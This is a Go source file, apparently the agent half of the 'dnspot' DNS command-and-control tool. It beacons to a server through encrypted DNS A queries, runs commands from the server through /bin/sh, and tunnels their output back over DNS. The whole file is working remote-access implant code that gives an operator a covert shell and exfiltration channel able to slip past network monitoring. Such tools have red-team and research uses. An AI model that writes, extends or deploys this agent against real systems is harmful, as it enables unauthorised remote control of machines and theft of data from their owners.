package agent

import (
	"bufio"
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/conf"
	"github.com/mosajjal/dnspot/cryptography"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

func errorHandler(err error) {
	if err != nil {
		panic(err.Error())
	}
}

var exiting chan bool

// this is where all the multi-part packets will live. The key is parentPartID
var PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)

var AgentStatus struct {
	LastAckFromServer   uint32
	NextMessageType     c2.MsgType
	NextPayload         []byte
	CurretBatchParentID uint16
	HealthCheckInterval time.Duration
	MessageTicker       *time.Ticker
}

func ResetAgent() {
	AgentStatus.NextMessageType = c2.MessageHealthcheck
	AgentStatus.NextPayload = []byte{}
}

func runCommand(command string, cmdType c2.CmdType, timestamp uint32) {
	switch cmdType {
	case c2.CommandExec:
		log.Info("Running command: ", command)

		// Create a new context and add a timeout to it
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second) //todo: timeout should probably be configurable
		defer cancel()                                                          // The cancel should be deferred so resources are cleaned up

		cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)

		out, err := cmd.CombinedOutput()
		AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
		AgentStatus.NextPayload = out
		if err != nil {
			log.Warnf("Error in running command %s: %s", cmd, err)
			cancel()
		}
	case c2.CommandEcho:
		fmt.Printf("[SERVER AT %v]: %s\n", time.Unix(int64(timestamp), 0), command)
		AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
		AgentStatus.NextPayload = []byte("msg delivered")
	}
}

func grabFullPayload(packets []c2.MessagePacketWithSignature) ([]byte, error) {
	fullPayload := make([]byte, 0)
	packets = c2.CheckMessageIntegrity(packets)
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// todo: clean the memory for this parentpartID
	delete(PacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
	return bytes.Trim(fullPayload, "\x00"), nil

}

func handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
	if len(msgList) == 0 {
		return errors.New("incoming message is empty")
	}
	command := msgList[0] // todo: handle multiple commands at the same time?
	AgentStatus.LastAckFromServer = command.Msg.TimeStamp
	log.Infof("got message from Server: Type: %v, Payload: %s", command.Msg.MessageType, command.Msg.Payload) //todo: act on server's command here

	// execution for last/single packets
	switch msgType := command.Msg.MessageType; msgType {
	case c2.MessageHealthcheck:
		return nil // nothing to do. server wants us to remain in healthcheck mode
	case c2.MessageExecuteCommand:
		AgentStatus.NextMessageType = msgType

		PacketBuffersWithSignature[int(command.Msg.ParentPartID)] = append(PacketBuffersWithSignature[int(command.Msg.ParentPartID)], command)
		// handle multipart packets here
		if command.Msg.ParentPartID != 0 { // multi part
			//fist and middle packets
			msg := c2.MessagePacket{
				TimeStamp:    uint32(time.Now().Unix()),
				MessageType:  AgentStatus.NextMessageType,
				ParentPartID: command.Msg.ParentPartID,
				PartID:       command.Msg.PartID,
			}
			if command.Msg.IsLastPart {
				msg.IsLastPart = true
				// todo: go back to healthcheck
				AgentStatus.NextMessageType = c2.MessageHealthcheck
			}
			payload := []byte("Ack!")
			// log.Infof("sending plyload %#v\n", msg)
			// time.Sleep(2 * time.Second)
			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
			for _, Q := range Questions {
				err = SendQuestionToServer(Q)
				if err != nil {
					log.Infof("Error sending Message to Server: %s", err)
				}
			}
			if err != nil {
				log.Warnf("Error sending Message to Server: %s", err)
			}
			if !command.Msg.IsLastPart {
				return nil
			}
		}
		fullPayload, err := grabFullPayload(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
		if err != nil {
			log.Warnf("error grabbing full payload: %s", err)
		}
		runCommand(string(fullPayload), command.Msg.Command, command.Msg.TimeStamp)
		// AgentStatus.NextMessageType = c2.MessageHealthcheck
		// runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])

	case c2.MessageExecuteCommandResponse:
		if command.Msg.IsLastPart || command.Msg.ParentPartID == 0 {
			log.Infof("got last part of command response") //todo: remove
			ResetAgent()
		}
		return nil
	case c2.MessageSetHealthInterval:
		log.Infof("Received command to explicitly set the healthcheck interval in milliseconds")
		// the time interval is packed in the lower 4 bytes of the message
		AgentStatus.HealthCheckInterval = time.Duration(binary.BigEndian.Uint32(command.Msg.Payload[0:4])) * time.Millisecond
		AgentStatus.MessageTicker = time.NewTicker(time.Duration(AgentStatus.HealthCheckInterval) * time.Millisecond)
		return nil
	case c2.MessageSyncTime:
		// throwing a warning for out of sync time for now
		log.Warnf("Time is out of Sync.. not touching system time but please go and fix it!")
		log.Warnf("UTC time coming from the server: %s", command.Msg.Payload)
		return nil
	}

	return nil
}

// SendMessageToServer is the mirror of SendMessageToAgent on agent's side.
// it allows the agent to send arbitrary messeges to the server. At the moment
// this will not disrupt the flow of healthcheck messages coming from the agent
// and those message should be dismissed on the server side during this transmission
func SendMessageToServer(msg string) {
	log.Infoln("sending message to server")
	AgentStatus.NextMessageType = c2.MessageExecuteCommandResponse
	AgentStatus.NextPayload = []byte(msg)
}

func SendQuestionToServer(Q string) error {
	if len(Q) < 255 {
		// todo: implement retry here
		// todo: handle response form server
		response, err := c2.PerformExternalAQuery(Q, conf.GlobalAgentConfig.ServerAddress)
		if err != nil {
			return fmt.Errorf("failed to send the payload: %s", err)
		}
		msgList, skip, err := c2.DecryptIncomingPacket(response, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
		if err != nil && !skip {
			return fmt.Errorf("error in decrypting incoming packet from server: %s", err)
		} else if !skip {
			return handleServerCommand(msgList)
		}
	} else {
		return fmt.Errorf("query is too big %d, can't send this", len(Q))
	}
	return nil
}

func sendHealthCheck() error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: AgentStatus.NextMessageType,
	}
	// set payload based on next message type?
	payload := []byte("Ping!")
	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
	if err != nil {
		log.Warnf("Error sending Message to Server: %s", err)
	}
	for _, Q := range Questions {
		err = SendQuestionToServer(Q)
		if err != nil {
			log.Warnf("Error sending Healthcheck: %s", err)
		}
	}
	return nil
}

func RunAgent(cmd *cobra.Command, args []string) error {
	log.SetLevel(log.Level(conf.GlobalAgentConfig.LogLevel))
	if conf.GlobalAgentConfig.LogLevel >= uint8(log.DebugLevel) {
		log.SetReportCaller(true)
	}

	log.Infof("Starting agent...")
	// set global flag that we're running as Agent
	conf.Mode = conf.RunAsAgent

	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
	AgentStatus.HealthCheckInterval = 3 * time.Second //todo:make this into a config parameter
	AgentStatus.NextMessageType = c2.MessageHealthcheck
	AgentStatus.MessageTicker = time.NewTicker(AgentStatus.HealthCheckInterval)

	if !strings.HasSuffix(conf.GlobalAgentConfig.DnsSuffix, ".") {
		conf.GlobalAgentConfig.DnsSuffix = conf.GlobalAgentConfig.DnsSuffix + "."
	}
	if !strings.HasPrefix(conf.GlobalAgentConfig.DnsSuffix, ".") {
		conf.GlobalAgentConfig.DnsSuffix = "." + conf.GlobalAgentConfig.DnsSuffix
	}

	var err error
	// generate a new private key if the user hasn't provided one
	if conf.GlobalAgentConfig.PrivateKey == nil {
		conf.GlobalAgentConfig.PrivateKey, err = cryptography.GenerateKey()
		errorHandler(err)
	} else {
		conf.GlobalAgentConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalAgentConfig.PrivateKeyBasexx)
		errorHandler(err)
	}

	// extract the public key from the provided Base32 encoded string
	conf.GlobalAgentConfig.ServerPublicKey, err = cryptography.PublicKeyFromString(conf.GlobalAgentConfig.ServerPublicKeyBasexx)
	errorHandler(err)

	// start the agent by sending a healthcheck
	if err := sendHealthCheck(); err != nil {
		log.Warnln(err)
	}
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			fmt.Print("-> ")
			text, _ := reader.ReadString('\n')
			// convert CRLF to LF
			text = strings.Replace(text, "\n", "", -1)
			if err != nil {
				log.Errorln("can't find a key to send a message to")
			} else {
				SendMessageToServer(text)
			}
		}
	}()

	for {
		select {
		case <-exiting:
			// When exiting, return immediately
			return nil
		case <-AgentStatus.MessageTicker.C:
			if AgentStatus.NextMessageType == c2.MessageHealthcheck {
				if err := sendHealthCheck(); err != nil {
					log.Warnln(err)
				}
			}
			if AgentStatus.NextMessageType == c2.MessageExecuteCommandResponse {
				msg := c2.MessagePacket{
					TimeStamp:   uint32(time.Now().Unix()),
					MessageType: AgentStatus.NextMessageType,
				}
				payload := []byte(AgentStatus.NextPayload)
				Questions, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalAgentConfig.DnsSuffix, conf.GlobalAgentConfig.PrivateKey, conf.GlobalAgentConfig.ServerPublicKey)
				if err != nil {
					log.Warnf("Error sending Message to Server 1") //todo:update msg
				}
				for _, Q := range Questions {
					err = SendQuestionToServer(Q)
					if err != nil {
						log.Infof("Error sending Message to Server 2: %s", err) //todo:update msg
					}
				}
			}
			// function to handle response coming from the server and update the status accordingly
			// handleServerResponse(response)
		}
	}
}
